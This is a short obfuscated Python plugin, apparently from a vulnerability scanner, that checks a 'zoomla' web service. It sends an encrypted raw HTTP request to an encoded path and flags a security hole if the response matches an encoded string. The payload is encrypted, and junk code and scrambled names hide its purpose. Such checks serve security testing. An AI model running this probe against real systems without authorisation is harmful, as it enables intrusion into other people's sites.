#Embedded file name: zooml.py
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == '''zoomla''':
        return (True, arg)
        if 0:
            O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def audit(arg):
    o0OO00 = decode('\x9c\x05\xcb\x9ew\xb7\x8c\xa2{\x01\x9c\x15\xad\xe0\x02J\xc0<\x8f\xa4\xd3\xfb\xffO\xb0\'\xc3\xb5\xd3\x91\xd6\xc7\x80?\xfd\x83\x14\xc5\x83\xb0JS\x9e\x02\x9b\x95vu\xec\x18\x91\xd4\x96\x85\xaf&\x89\x04\xf6\xc3\xa8\xd5\x81\xa2\xf4]\xa3\xf6q\xa7\xc4\xc2:d\xdb\\\xa1\xa0\x15z\xf06\x98\xf4\xc9\xf7\xd8}\x865\xa4\x86\xaa\xd1\x80\x9e\x88\x0e\xc7\x823\xc1\xe6\xe1k!\x883\xea\x913l\xe2V\x8d\xa3\xc6\xe5\xe9|\x932\xd0\xf5\xed\xe6\xd3\xf6\x95-\xf4\xe11\xd7\x83\xe2~4\x8a5\x8b\xa3&z\xf3&\xbe\xd4\xc4\xf5\xf8:\x97`\x86\xa5\x98\xd6\xc7\xe7\x80\x0f\xe6\xe0\x02\xd5\xa0\xa5-R\xfdT\xef\x87a;\x82S\xf7\xba\xf6\xf7\xdf\x1f\x9b\x06\xd3\xe5\xcb\xf3\x95\xef\xa3\x18\xe5\x904\xd4\xf3\xf4\rt\xcet\x97\xc7b\t\xa1\x1e\x8f\x84\xd7\xe0\xbbJ\xc5R\xfd\xa3\x8b\xc7\x95\xec\x94:\xf4\x82\n\xd5\xa0\x9b|5\xfdc\xed\xe6U\x0b\x84U\xdf\x9d\xc8\xeb\xe0G\xc0w\xc1\xd4\xfc\x84\x95\xcd\x81\x0e\xc5\xa0e\x84\x9d\x81{\x13\x8b#\xd9\xab4[\xd2\x06\x8f\xb2\xd1\x95\xbe8\xe0s\xa1\xa2\xba\xc0\xa0\x97\xd6j\xb7\xab5\xe0\xb3\xb2\x7fC\xcbB\xfa\xd7U\x1b\x95@\xe8\xc4\x84\xb2\xbbp\x93\x16\xd2\xe2\xdc\xe6\x80\x80\xe5]\x83\xf6]\xfc\xb3\x82k!\xad3\xca\x9e {\xf0s\xdd\xbc\xd7\xe5\xfe^\x87\'\xe6\xc3\xbd\xb4\xe6\xd0\x83m\xf6\x832\xd4\xf6\xe1N\x03\x9b\x15\x98\x83\x12i\xb6F\xce\xf4\x91\xdb\xeal\xb9%\xc7\xef\xfd\xb1\xc6\xdc\xa3+\xd4\x92\'\xe0\x96\x87F(\x83b\x9d\xb0Cf\xfbp\x9b\x8e\xd6\xce\xdf&\x9b\x07\xf2\xd7\xca\x90\x86\xff\x80\x1d\xc6\x86\'\xf5\x91\xc7.\x16\x8ce\xa1\xb8uY\xe3c\x89\xf0\x86\x85\xbd&\xe9d\x91\x95\x9d\xc6\x86\xc9\x81\x1e\xcd\x812\xed\xb3\x85}\x18\xbd#\xba\x92&[\xf73\xb5\xbf\xcf\xb2\xffo\xf6.\xd8\xa3\xc8\xbc\xc1\xdc\xb4T\xcf\xa0\x14\xc1\x91\x82kc\x87$\xad\x97\x05K\xf3\x10\x8f\x94\xe1\x80\xbbm\xb0\x13\xd1\x95\xcf\x85\xd0\xe4\xe6~\xd4\x83$\xd5\xd7\xc1G"\x8d\'\x98\x833o\x81c\xdd\x86\xd0\xe5\xeao\x93$\xd3\x91\xae\xa0\xc4\xd4\xf3&\xc3\x979\xa4\xea\x99]\x13\x8b\'\xba\x96er\xf7\x11\x8c\xc1\x82\xf6\xffH\x80%\xf2\xd6\xcb\x87\xe6\xd7\xe38\xa4\xa3\x04\xe7\xa1\xb3_Z\xe4b\xfd\xe7s*\x84`\xdb\xf1\xa8\xb5\xa8\x1f\xd0d\x91\xfb\xdf\xb5\xef\xe6\x95\x17\xc4\xb7$\xec\xb3\xb4M1\x9e\x12\x8f\xb5\x1eg\xecA\x99\x84\xb7\xff\xe1)\x85\x1e\xd6\xee\xea\xc6\x86\x9e')
    oo = arg + decode("\x9c=\xe2\xa2%\xe7\xb4\xd2Z\x05\xaf\x1f\x8b\x90'b\xe5\x16\xae\xb7\xc3\x95\xe6H\x80\x04\xd2\xc7\xc4\x85\xf6\xf5\x93/\xd3\xf0'\xf0\x82\xa7")
    i1iII1IiiIiI1, iIiiiI1IiI1I1, o0OoOoOO00, I11i, O0O = curl.curl2(oo, raw=o0OO00)
    if o0OoOoOO00.endswith(decode('\xf3&\xc3\x979')):
        security_hole(arg + decode("\x85:\xf4\xa0'\xc5\xa1\xb3m!\xbaE") + o0OoOoOO00)
        if 0:
            i11ii11iIi11i.oOoO0oo0OOOo + IiiI / Iii1ii1II11i


if __name__ == '__main__':
    from dummy import *

#KEY---d876bfdb7f8cc8e92678c67ed1db7e37a95dd5ef8aaeb304cb7f8a8e86dd9dbc---